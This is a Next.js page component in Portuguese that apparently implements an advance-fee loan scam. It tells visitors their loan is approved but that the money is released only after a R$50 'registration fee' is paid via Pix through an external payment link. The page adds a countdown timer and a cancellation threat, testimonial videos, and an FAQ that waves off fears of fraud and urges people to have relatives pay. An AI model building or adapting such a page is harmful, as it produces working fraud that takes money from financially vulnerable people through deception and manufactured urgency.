'use client'
import React, { useState, useEffect } from "react";
import { useRouter } from "next/navigation";


export default function ConversaoPage() {
    const videos = ["video2.mp4", "video3.mp4", "video4.mp4"];
    const [minutes, setMinutes] = useState(30);
    const [seconds, setSeconds] = useState(0);

    const router = useRouter();


    useEffect(() => {
        if (minutes === 0 && seconds === 0) return;

        const interval = setInterval(() => {
            setSeconds((prevSeconds) => {
                if (prevSeconds === 0) {
                    if (minutes > 0) {
                        setMinutes((prevMinutes) => prevMinutes - 1);
                        return 59;
                    }
                    return 0;
                }
                return prevSeconds - 1;
            });
        }, 1000);

        return () => clearInterval(interval);
    }, [minutes, seconds]);

    const faqs = [
        {
            question: "Por que a tarifa não é descontada do empréstimo?",
            answer: "O valor da Tarifa de Cadastro é tratado separadamente para garantir transparência e clareza no processo de concessão de crédito. Descontar a tarifa diretamente do valor do empréstimo poderia causar confusão sobre os custos envolvidos."
        },
        {
            question: "O que acontece após pagar a tarifa?",
            answer: "Você será redirecionado automaticamente para a página onde confirmará e autorizará a transferência do dinheiro para sua conta."
        },
        {
            question: "Quanto tempo demora para liberar o crédito?",
            answer: "Como o pagamento é feito via Pix, a liberação do empréstimo é imediata. Todo o processo, incluindo a transferência do crédito, leva cerca de 5-10 minutos."
        },
        {
            question: "Tô com medo de cair em golpe",
            answer: "Symplis atua há mais de 14 anos com empréstimos online, contando com milhares de clientes satisfeitos. Nosso site é seguro e confiável."
        },
        {
            question: "Posso pagar a tarifa com cartão de crédito?",
            answer: "Não, a tarifa de cadastro só pode ser paga via Pix. Se você não tem uma conta em um banco que oferece Pix, peça a um amigo ou familiar para fazer o pagamento para você."
        },
        {
            question: "O que acontece se eu não pagar a tarifa?",
            answer: "O não pagamento da tarifa resulta no cancelamento do contrato do empréstimo, impossibilitando uma nova contratação por um prazo máximo de 30 dias."
        }
    ];

    const handleContinuarClick = () => {
            router.push("https://go.tribopay.com.br/nm5iws0kia");

    };

    const [expandedIndex, setExpandedIndex] = useState<number | null>(null);

    const toggleFAQ = (index: number) => {
        setExpandedIndex(expandedIndex === index ? null : index);
    };

    return (
        <div className="bg-gray-50 min-h-screen flex flex-col items-center justify-center p-4">
            {/* Header */}
            <h1 className="text-3xl font-bold text-rosa mb-4">Parabéns, falta pouco para você receber!</h1>
            <p className="text-center text-gray-600 mb-6 max-w-md">
                Você está a um passo de receber seu empréstimo. Efetue o pagamento da tarifa de cadastro para autorizar o saque imediatamente para sua conta.
            </p>

            {/* Tarifa de Cadastro Section */}
            <div className="bg-white rounded-lg shadow-md p-6 mb-6 w-full max-w-md">
                <h2 className="text-lg font-semibold mb-2">O que é a Tarifa de Cadastro?</h2>
                <p className="text-gray-600 mb-4">Aumente o volume 🔊🔊🔊🔊</p>
                <video controls className="w-full rounded-lg">
                    <source src="/video1.mp4" type="video/mp4" />
                    Seu navegador não suporta o elemento de vídeo.
                </video>
            </div>

            {/* Timeline Section */}
            <div className="bg-white rounded-lg shadow-md p-6 mb-6 w-full max-w-md">
                <div className="flex flex-col items-start space-y-4">
                    <div className="flex items-center space-x-2">
                        <span className="text-green-600">✔️</span>
                        <span>Simulação - Simulação realizada e cadastro concluído</span>
                    </div>
                    <div className="flex items-center space-x-2">
                        <span className="text-green-600">✔️</span>
                        <span>Análise de Crédito - Oferta de crédito disponível para você</span>
                    </div>
                    <div className="flex items-center space-x-2">
                        <span className="text-red-600">❗</span>
                        <span>Pagamento de Tarifa - Aguardando pagamento para liberação do crédito</span>
                    </div>
                    <div className="flex items-center space-x-2 text-gray-400">
                        <span>💵</span>
                        <span>Crédito na conta - Crédito enviado para sua conta bancária</span>
                    </div>
                </div>
            </div>

            {/* Oferta Section com cronômetro */}
            <div className="text-center mb-6">
                <h2 className="text-xl font-semibold text-red-600">Sua oferta expira em</h2>
                <div className="flex justify-center space-x-2 text-2xl font-bold text-red-600 my-2">
                    <div className="bg-red-100 px-4 py-1 rounded">{String(minutes).padStart(2, '0')} minutos</div>
                    <div className="bg-red-100 px-4 py-1 rounded">{String(seconds).padStart(2, '0')} segundos</div>
                </div>
                <p className="text-gray-500 text-sm">
                    O não pagamento da tarifa resulta no cancelamento do contrato do empréstimo, impossibilitando uma nova contratação por um prazo máximo de 30 dias.
                </p>
            </div>

            {/* Pagamento Section */}
            <div className="bg-white rounded-lg shadow-md p-6 mb-6 w-full max-w-md">
                <h2 className="text-center text-lg font-semibold mb-2">Pague via Pix 💸</h2>
                <p className="text-center text-gray-600 mb-4">O pagamento será confirmado imediatamente</p>
                <p className="text-center text-3xl font-bold text-green-600 mb-4">R$ 50</p>
                <button
                onClick={handleContinuarClick} 
                className="bg-rosa text-white font-semibold py-3 rounded-2xl w-full hover:bg-pink-700">
                    Pagar Agora
                </button>
                <p className="text-center text-gray-400 mt-2 text-sm">🛡️ Ambiente seguro</p>
            </div>

            {/* Testimonial Section */}
            <h2 className="text-xl font-semibold text-start mb-4">Algumas pessoas que mudaram de vida</h2>
            <div className="space-y-6 w-full max-w-md">
                {videos.map((video, index) => (
                    <video key={index} controls className="w-full rounded-lg shadow-md">
                        <source src={`/${video}`} type="video/mp4" />
                        Seu navegador não suporta o elemento de vídeo.
                    </video>
                ))}
            </div>

            {/* FAQ Section */}
            <h2 className="text-2xl font-semibold text-start mt-8 mb-4">Dúvidas frequentes</h2>
            <div className="space-y-4 w-full max-w-md">
                {faqs.map((faq, index) => (
                    <div key={index} className="bg-white rounded-lg shadow-md p-4">
                        <button
                            onClick={() => toggleFAQ(index)}
                            className="w-full flex justify-between items-center text-left text-rosa font-semibold"
                        >
                            <span>{faq.question}</span>
                            <span>{expandedIndex === index ? "▼" : "▲"}</span>
                        </button>
                        {expandedIndex === index && (
                            <p className="text-gray-600 mt-2">{faq.answer}</p>
                        )}
                    </div>
                ))}
            </div>
        </div>
    );
}
